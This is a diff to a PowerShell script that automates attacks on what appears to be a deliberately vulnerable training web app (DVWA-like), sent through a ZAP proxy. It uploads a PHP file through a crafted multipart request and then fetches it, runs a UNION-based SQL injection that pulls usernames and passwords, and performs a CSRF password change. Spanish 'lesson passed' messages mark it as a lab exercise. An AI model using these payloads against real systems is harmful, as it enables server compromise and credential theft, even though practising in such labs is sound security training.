@@ -1,8 +1,8 @@
 ﻿#---------------------------------------------------------------------------------------------------------------------------
 # Load Resurces
 #---------------------------------------------------------------------------------------------------------------------------
-$homePage = "http://192.168.43.157:5001"
-$zap_proxy = "http://172.22.225.205:8082" 
+$homePage = "http://192.168.42.39:8086"
+$zap_proxy = "http://172.25.194.216:8082" 
 
 Clear-Host
 
@@ -55,29 +55,37 @@ $response.ParsedHtml.getElementsByTagName('pre').item(0).innertext
 # Upload File attack
 #---------------------------------------------------------------------------------------------------------------------------
 $rute = "$homePage/{0}" -f $dict["upload"]
-$response = wget "$rute" -WebSession $rb -Proxy $zap_proxy 
-
+$response = wget $rute -WebSession $rb -Proxy $zap_proxy 
+$user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
 
 #$body = Get-Content("$PSScriptRoot\Resources\hack.php") -Raw
 $fileBin = [System.IO.File]::ReadAlltext("$PSScriptRoot\Resources\hack.php")
-$boundary = "-----------------------------{0}" -f [System.Guid]::NewGuid().ToString()
+$boundary = "------{0}" -f [System.Guid]::NewGuid().ToString()
+
 
 $LF = "`r`n"
+$filebin = ($filebin -f $boundary) -join $LF
 $bodyLines = (
-    "--$boundary$LF",
-    "Content-Disposition: form-data; name=`"file`"; filename=`"hack_2.php`"",
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"MAX_FILE_SIZE`"$LF",
+    "100000",
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"uploaded`"; filename=`"php_2.php`"",
     "Content-Type: application/octet-stream$LF",
-    "$fileBin",
-    "--$boundary--$LF"
+    "<?php phpinfo() ?>",
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"Upload`"$LF",
+    "Upload",
+    "$boundary--$LF"
 ) -join $LF
 
-$response  = wget -Uri $rute -Method Post -WebSession $rb -ContentType "multipart/form-data; boundary=""$boundary""" -Body $bodyLines -Proxy $zap_proxy 
-#$response = Invoke-RestMethod -Uri $rute -Method Post -ContentType "multipart/form-data" -Body -Proxy "http://172.22.225.205:8082"
-#$response = wget $rute -WebSession $rb -Method Post -Body $body -Proxy "http://172.22.225.205:8082" 
+$response  = wget -Uri $rute -Method Post -WebSession $rb -ContentType "multipart/form-data; boundary=$boundary" -Body $fileBin -UserAgent $user_agent -Proxy $zap_proxy 
+$response.ParsedHtml.getElementsByTagName('pre').item(0).innertext
 
-$response = wget "$homePage/hackable/uploads/hack_2.php" -WebSession $rb -Proxy $zap_proxy 
+$response = wget "$homePage/hackable/uploads/php_2.php" -WebSession $rb -Proxy $zap_proxy 
 $t= $response.ParsedHtml.getElementsByTagName('table').item(1)
 $t.children[0].children[0].innerText
+write-host "Lección Upload File  attack superada!!!"
  
 #---------------------------------------------------------------------------------------------------------------------------
 # SQLi attack
@@ -89,6 +97,7 @@ $response = wget "$rute" -WebSession $rb -Proxy $zap_proxy
 
 $response = wget "$rute`?id=%25%27+union+select+user%2Cpassword+from+users%23&Submit=Submit" -WebSession $rb -Proxy $zap_proxy 
 $response.ParsedHtml.getElementsByTagName('pre').item(0).innertext
+write-host "Lección SQLi attack superada!!!"
 
 #---------------------------------------------------------------------------------------------------------------------------
 # Cross-Site Request Forgery (CSRF) attack
@@ -100,3 +109,8 @@ $response = wget "$rute" -WebSession $rb -Proxy $zap_proxy
 
 $response = wget ("$rute{0}" -f ("?password_new=patata&password_conf=patata&Change=Change")) -WebSession $rb -Proxy $zap_proxy 
 $response.ParsedHtml.getElementsByTagName('pre').item(0).innertext
+
+$response = wget ("$rute{0}" -f ("?password_new=patata&password_conf=patata&Change=Change")) -WebSession $rb -Proxy $zap_proxy 
+$old_pass = $response.ParsedHtml.getElementsByTagName('pre').item(0).innertext
+
+if($old_pass -eq 'password'){write-host "Lección Cross-Site Request Forgery (CSRF) attack superada!!!"}
